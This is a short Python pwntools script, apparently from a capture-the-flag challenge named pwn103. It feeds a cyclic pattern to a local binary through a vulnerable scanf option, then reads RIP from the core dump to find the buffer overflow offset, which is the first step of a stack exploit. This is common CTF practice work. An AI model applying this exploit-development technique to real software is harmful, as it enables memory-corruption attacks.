#!/usr/bin/env python
from pwn import *

# 1) Generate pattern (n=8 for 64-bit)
pat = cyclic(300, n=8)

p = process('./pwn103-1644300337872.pwn103')
p.sendlineafter(b'channel: ', b'3')   # navigate to vulnerable scanf
p.sendline(pat)
p.wait()

# 2) Read RIP from core and compute offset
core = p.corefile
rip_val = core.rip
print("RIP:", hex(rip_val))
print("offset:", cyclic_find(rip_val, n=8))
